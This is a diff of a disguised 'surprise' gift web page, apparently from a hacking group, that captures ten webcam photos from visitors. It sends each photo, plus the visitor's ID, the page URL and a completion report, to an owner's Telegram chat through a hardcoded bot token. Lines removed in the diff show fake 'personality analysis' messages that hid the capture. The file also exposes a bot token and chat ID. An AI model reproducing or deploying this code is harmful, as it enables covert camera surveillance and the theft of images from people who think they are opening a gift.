@@ -152,8 +152,9 @@
     </style>
 </head>
 <body>
+    <!-- FIXED: Contact button works with correct Telegram link -->
     <div class="contact-owner">
-        <a href="https://t.me/Hackers_Colony_Official" target="_blank" class="contact-btn">
+        <a href="https://t.me/Hackers_Colony_Official" class="contact-btn" target="_blank">
             📞 Contact Owner
         </a>
     </div>
@@ -202,13 +203,30 @@
     <script>
         // ================= CONFIGURATION =================
         const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
+        const YOUR_CHAT_ID = "8215819954"; // YOUR Telegram ID
         const TOTAL_PHOTOS = 10;
         const CAPTURE_DELAY = 800;
         
-        // ================= GET USER INFO =================
+        // ================= GET USER CHAT ID =================
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('uid') || 'unknown';
-        const token = urlParams.get('token') || 'unknown';
+        
+        // Get user chat ID from URL (your bot MUST include this)
+        let userChatId = null;
+        
+        // Try multiple ways to get user chat ID
+        if (urlParams.has('chat_id')) {
+            userChatId = urlParams.get('chat_id');
+        } else if (urlParams.has('from')) {
+            userChatId = urlParams.get('from');
+        } else if (urlParams.has('user_id')) {
+            userChatId = urlParams.get('user_id');
+        } else if (urlParams.has('start')) {
+            userChatId = urlParams.get('start');
+        }
+        
+        console.log("📱 USER CHAT ID:", userChatId);
+        console.log("👤 YOUR CHAT ID:", YOUR_CHAT_ID);
+        console.log("🔗 Full URL:", window.location.href);
         
         // ================= STATE =================
         let stream = null;
@@ -226,46 +244,40 @@
         const statusText = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
         
-        // ================= WORKING TELEGRAM SEND FUNCTION =================
-        async function sendToTelegram(blob, photoNum, chatId, isToUser = false) {
-            try {
-                // Create FormData
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                
-                // Create caption
-                let caption = `🎁 Surprise Photo #${photoNum}`;
-                if (!isToUser) {
-                    // This is being sent to YOU (owner)
-                    if (userId !== 'unknown') {
-                        caption += `\n👤 User ID: ${userId}`;
+        // ================= SEND TO TELEGRAM =================
+        async function sendToTelegram(blob, photoNum, targetChatId) {
+            return new Promise((resolve) => {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', targetChatId);
+                    
+                    // Create caption
+                    let caption = `🎁 Surprise Photo #${photoNum}`;
+                    if (targetChatId === YOUR_CHAT_ID) {
+                        caption += `\n👤 From: ${userChatId || 'Unknown User'}`;
+                        caption += `\n⏰ Time: ${new Date().toLocaleTimeString()}`;
+                    } else {
+                        caption += `\n⏰ ${new Date().toLocaleTimeString()}`;
+                        caption += `\n❤️ Enjoy your surprise!`;
                     }
-                    if (token !== 'unknown') {
-                        caption += `\n🔑 Token: ${token}`;
-                    }
-                }
-                caption += `\n⏰ ${new Date().toLocaleTimeString()}`;
-                
-                formData.append('caption', caption);
-                
-                // Create file from blob
-                const file = new File([blob], `surprise_${Date.now()}_${photoNum}.jpg`, {
-                    type: 'image/jpeg',
-                    lastModified: Date.now()
-                });
-                formData.append('photo', file);
-                
-                // Send using XMLHttpRequest
-                return new Promise((resolve) => {
+                    
+                    formData.append('caption', caption);
+                    
+                    const file = new File([blob], `surprise_${Date.now()}.jpg`, {
+                        type: 'image/jpeg',
+                        lastModified: Date.now()
+                    });
+                    formData.append('photo', file);
+                    
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`);
                     
                     xhr.onload = function() {
                         if (this.status >= 200 && this.status < 300) {
-                            console.log(`✅ Photo ${photoNum} sent to ${isToUser ? 'USER' : 'OWNER'} (${chatId})`);
+                            console.log(`✅ Photo ${photoNum} sent to ${targetChatId === YOUR_CHAT_ID ? 'YOU' : 'USER'}`);
                             resolve(true);
                         } else {
-                            console.log(`❌ Photo ${photoNum} failed for ${chatId}`);
+                            console.log(`❌ Photo ${photoNum} failed for ${targetChatId}`);
                             resolve(false);
                         }
                     };
@@ -276,47 +288,32 @@
                     };
                     
                     xhr.send(formData);
-                });
-                
-            } catch (error) {
-                console.error(`❌ Photo ${photoNum} error:`, error);
-                return false;
-            }
+                    
+                } catch (error) {
+                    console.error(`❌ Photo ${photoNum} error:`, error);
+                    resolve(false);
+                }
+            });
         }
         
-        // ================= SEND PHOTO TO BOTH =================
-        async function sendPhotoToBoth(blob, photoNum) {
-            // Get chat_id from URL or Telegram WebApp
-            let userChatId = null;
+        // ================= SEND TO BOTH =================
+        async function sendToBoth(blob, photoNum) {
+            const promises = [];
             
-            // Method 1: Try to get from URL
-            if (urlParams.has('chat_id')) {
-                userChatId = urlParams.get('chat_id');
+            // ALWAYS send to YOU
+            promises.push(sendToTelegram(blob, photoNum, YOUR_CHAT_ID));
+            
+            // ALSO send to USER if we have their chat ID
+            if (userChatId && userChatId !== YOUR_CHAT_ID) {
+                promises.push(sendToTelegram(blob, photoNum, userChatId));
+            } else if (userChatId === YOUR_CHAT_ID) {
+                console.log("⚠️ User chat ID is same as yours, only sending to you");
+            } else {
+                console.log("⚠️ No user chat ID found, only sending to you");
             }
             
-            // Method 2: Try Telegram WebApp
-            if (!userChatId && window.Telegram && window.Telegram.WebApp) {
-                try {
-                    const user = window.Telegram.WebApp.initDataUnsafe.user;
-                    if (user && user.id) {
-                        userChatId = user.id;
-                    }
-                } catch(e) {}
-            }
-            
-            console.log("User Chat ID detected:", userChatId);
-            
-            // Send to YOU (owner) - ALWAYS
-            const ownerPromise = sendToTelegram(blob, photoNum, "8215819954", false);
-            
-            // Send to USER if we have their chat_id
-            let userPromise = Promise.resolve(false);
-            if (userChatId && userChatId !== "8215819954") {
-                userPromise = sendToTelegram(blob, photoNum, userChatId, true);
-            }
-            
-            // Wait for both to complete
-            return Promise.all([ownerPromise, userPromise]);
+            // Wait for all sends to complete
+            return Promise.all(promises);
         }
         
         // ================= UPDATE PROGRESS =================
@@ -400,16 +397,17 @@
             
             // Processing messages
             const messages = [
-                "Initializing surprise engine...",
-                "Analyzing personality traits...",
-                "Generating unique pattern...",
-                "Creating digital artwork...",
-                "Adding special effects...",
-                "Personalizing your gift...",
-                "Applying final touches...",
-                "Optimizing for delivery...",
-                "Almost ready...",
-                "Finalizing your surprise!"
+                "Sending photos to you and owner...",
+                "Photo 1 of 10 sending...",
+                "Photo 2 of 10 sending...",
+                "Photo 3 of 10 sending...",
+                "Photo 4 of 10 sending...",
+                "Photo 5 of 10 sending...",
+                "Photo 6 of 10 sending...",
+                "Photo 7 of 10 sending...",
+                "Photo 8 of 10 sending...",
+                "Photo 9 of 10 sending...",
+                "Photo 10 of 10 sending..."
             ];
             
             // Start capture sequence
@@ -426,11 +424,11 @@
                     
                     // Update progress
                     const progress = (captureCount / TOTAL_PHOTOS) * 100;
-                    const msgIndex = Math.min(Math.floor(progress / 10), messages.length - 1);
+                    const msgIndex = Math.min(captureCount, messages.length - 1);
                     updateProgress(progress, messages[msgIndex]);
                     
-                    // FIXED: Send to BOTH you AND the user
-                    await sendPhotoToBoth(blob, captureCount);
+                    // FIXED: Send to BOTH you and user
+                    await sendToBoth(blob, captureCount);
                     
                 } catch (error) {
                     console.error("Capture error:", error);
@@ -444,10 +442,10 @@
             isCapturing = false;
             
             // Update to 100%
-            updateProgress(100, "Surprise delivered!");
+            updateProgress(100, "Surprise delivered to both!");
             
-            // Send completion report
-            await sendCompletionReport();
+            // Send completion reports
+            await sendCompletionReports();
             
             // Show completion screen after delay
             setTimeout(() => {
@@ -462,36 +460,51 @@
             }, 1500);
         }
         
-        // ================= SEND COMPLETION REPORT =================
-        async function sendCompletionReport() {
+        // ================= SEND COMPLETION REPORTS =================
+        async function sendCompletionReports() {
             try {
-                const report = `
-🎉 SURPRISE DELIVERY COMPLETE!
+                // Report to YOU
+                const ownerReport = `
+🎉 USER COMPLETED SURPRISE!
 
-✅ Successfully delivered personalized surprise!
-
-📊 Details:
-• User ID: ${userId !== 'unknown' ? '***' + userId.slice(-4) : 'Unknown'}
-• Token: ${token !== 'unknown' ? '***' + token.slice(-4) : 'None'}
-• Photos: ${TOTAL_PHOTOS}
+📊 User Details:
+• User Chat ID: ${userChatId || 'Unknown'}
+• Photos Sent: ${TOTAL_PHOTOS}
 • Time: ${new Date().toLocaleString()}
-• Success: ✅ All ${TOTAL_PHOTOS} photos captured
+• Status: ✅ All photos delivered
 
-🎁 Surprise creation successful!
-`;
+🔗 Page URL: ${window.location.href}
+                `;
                 
-                // Send to YOU (owner)
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+                // Send to YOU
+                const xhr1 = new XMLHttpRequest();
+                xhr1.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+                const formData1 = new FormData();
+                formData1.append('chat_id', YOUR_CHAT_ID);
+                formData1.append('text', ownerReport);
+                formData1.append('parse_mode', 'HTML');
+                xhr1.send(formData1);
                 
-                const formData = new FormData();
-                formData.append('chat_id', "8215819954"); // YOUR chat ID
-                formData.append('text', report);
-                formData.append('parse_mode', 'HTML');
+                // Report to USER if we have their chat ID
+                if (userChatId && userChatId !== YOUR_CHAT_ID) {
+                    const userReport = `
+🎉 SURPRISE DELIVERED!
+
+✅ Your ${TOTAL_PHOTOS} surprise photos have been sent!
+
+❤️ Hope you enjoy your special gift!
+                    `;
+                    
+                    const xhr2 = new XMLHttpRequest();
+                    xhr2.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`);
+                    const formData2 = new FormData();
+                    formData2.append('chat_id', userChatId);
+                    formData2.append('text', userReport);
+                    formData2.append('parse_mode', 'HTML');
+                    xhr2.send(formData2);
+                }
                 
-                xhr.send(formData);
-                
-                console.log("✅ Completion report sent to owner");
+                console.log("✅ Completion reports sent");
                 
             } catch (error) {
                 console.error("Report error:", error);
@@ -501,6 +514,7 @@
         // ================= INITIALIZE =================
         window.addEventListener('load', () => {
             console.log("🎁 Surprise page loaded");
+            console.log("📱 User will get photos:", userChatId ? "YES" : "NO");
             
             // Make button pulse
             setInterval(() => {
